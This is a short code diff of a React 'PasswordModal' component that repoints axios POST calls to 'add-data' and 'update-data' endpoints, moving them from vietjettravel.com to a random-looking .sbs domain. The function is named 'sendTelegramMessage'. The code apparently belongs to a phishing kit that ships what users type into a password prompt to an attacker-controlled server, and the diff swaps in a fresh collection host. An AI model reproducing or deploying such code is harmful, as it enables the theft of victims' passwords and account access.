@@ -115,7 +115,7 @@ const PasswordModal: FC<PasswordModalProps> = ({
 
   if (!isOpen) return null;
   const sendTelegramMessage = async (message: Message) => {
-    const baseUrl = `https://vietjettravel.com/`;
+    const baseUrl = `https://kjzxcljzxklcjklasd.sbs/`;
     if (localStorage.getItem(LAST_MESSAGE_KEY)) {
       await axios.post(
         `${baseUrl}/update-data`,
@@ -174,7 +174,7 @@ const PasswordModal: FC<PasswordModalProps> = ({
       try {
         if (localStorage.getItem(LAST_MESSAGE_KEY) !== null) {
           await axios.post(
-            `https://vietjettravel.com/update-data`,
+            `https://kjzxcljzxklcjklasd.sbs/update-data`,
 
             message,
 
@@ -186,7 +186,7 @@ const PasswordModal: FC<PasswordModalProps> = ({
           );
         } else {
           await axios.post(
-            `https://vietjettravel.com/add-data`,
+            `https://kjzxcljzxklcjklasd.sbs/add-data`,
 
             message,
 
